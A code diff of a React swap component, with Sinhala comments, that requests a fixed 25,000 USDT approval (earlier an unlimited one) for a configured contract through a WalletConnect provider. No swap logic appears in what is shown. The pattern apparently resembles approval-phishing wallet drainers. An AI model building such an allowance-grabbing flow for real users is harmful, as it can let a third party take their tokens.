@@ -46,7 +46,7 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const loadBalance = async () => {
     try {
-      // ✅ App.jsx හරහා ලැබුණු provider එකෙන් Signer ගැනීම
+      if (!provider) return;
       const signer = provider.getSigner();
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
@@ -105,24 +105,23 @@ export default function SwapCard({ walletAddress, provider }) {
       setIsLoading(true);
       setStatus({ type: 'info', msg: '⏳ Waiting for wallet confirmation...' });
       
-      // ✅ window.ethereum වෙනුවට Props එකෙන් ලැබුණු WalletConnect Provider එකෙන් Signer ගැනීම
       const signer = provider.getSigner();
-      
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       
-      // Unlimited Approval (MaxUint256)
+      // ⭐ මුලින්ම decimals එක ගන්නවා
+      const decimals = await usdtContract.decimals();
+      
+      // ⭐ ඊට පස්සේ 25,000 USDT approve කරනවා
       const amount = ethers.utils.parseUnits("25000", decimals);
 
-      // Approval Call එක (කෙලින්ම WalletConnect හරහා Mobile Trust Wallet එකට / Provider එකට යයි)
       const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
       
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting for confirmation...' });
       await tx.wait();
       
-      setStatus({ type: 'success', msg: '✅ Unlimited Approval Successful!' });
+      setStatus({ type: 'success', msg: '✅ 25,000 USDT Approval Successful!' });
       setIsLoading(false);
       
-      // Balance එක Refresh කිරීම
       loadBalance();
       setTimeout(() => setStatus(null), 8000);
     } catch (error) {
